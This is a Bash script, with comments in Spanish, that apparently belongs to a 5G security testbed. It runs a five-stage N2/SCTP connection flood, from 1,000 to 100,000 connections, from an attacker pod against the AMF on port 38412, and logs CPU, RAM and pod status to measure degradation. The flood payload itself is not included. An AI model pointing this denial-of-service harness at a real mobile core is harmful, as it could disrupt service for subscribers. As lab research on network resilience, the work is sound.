#!/bin/bash
# run_a3_n2_flood.sh
# Vector A3 -- Inundacion N2/SCTP sobre el AMF.
# Ejecuta la campana incremental de cinco runs (A-E) definida en el
# protocolo experimental, capturando el Indice de Degradacion de
# Recursos (IDR-CPU, IDR-RAM, IDR-RTT) del AMF durante cada run.
#
# Ejecutar desde el nodo master (no dentro del pod atacante), ya que
# requiere acceso a `kubectl top` y `kubectl exec`.
#
# Prerrequisito: copiar sctp_flood.py al pod atacante:
#   kubectl cp sctp_flood.py 5g-ran/attacker-ue-lateral:/tmp/sctp_flood.py

set -uo pipefail

CONDICION="${1:?Uso: run_a3_n2_flood.sh <C0|C1>}"
AMF_IP="${AMF_IP:?Definir AMF_IP con la IP del pod AMF}"
ATK=attacker-ue-lateral
LOG="a3_${CONDICION}.txt"

echo "=== A3 -- Condicion: ${CONDICION} | $(date -u) ===" | tee "$LOG"

echo "--- Baseline de recursos del AMF (pre-flood) ---" | tee -a "$LOG"
kubectl top pod -n 5g-cp -l app.kubernetes.io/name=amf | tee -a "$LOG"

for run in A:1000 B:5000 C:10000 D:50000 E:100000; do
  LABEL=${run%:*}
  CONNS=${run#*:}
  echo "=== RUN ${LABEL} -- ${CONNS} conexiones | $(date -u) ===" | tee -a "$LOG"

  kubectl exec -n 5g-ran "$ATK" -- python3 /tmp/sctp_flood.py "$AMF_IP" 38412 "$CONNS" &
  FLOOD_PID=$!

  echo "--- IDR durante el flood (6 muestras, cada 5s) ---" | tee -a "$LOG"
  for i in $(seq 1 6); do
    kubectl top pod -n 5g-cp -l app.kubernetes.io/name=amf | tee -a "$LOG"
    sleep 5
  done

  wait $FLOOD_PID

  echo "--- Estado del AMF tras run ${LABEL} ---" | tee -a "$LOG"
  kubectl get pods -n 5g-cp | grep amf | tee -a "$LOG"
done

echo "--- Estado final del AMF tras la campana completa ---" | tee -a "$LOG"
kubectl get pods -n 5g-cp | grep amf | tee -a "$LOG"
echo "Timestamp cierre A3 ${CONDICION}: $(date -u)" | tee -a "$LOG"
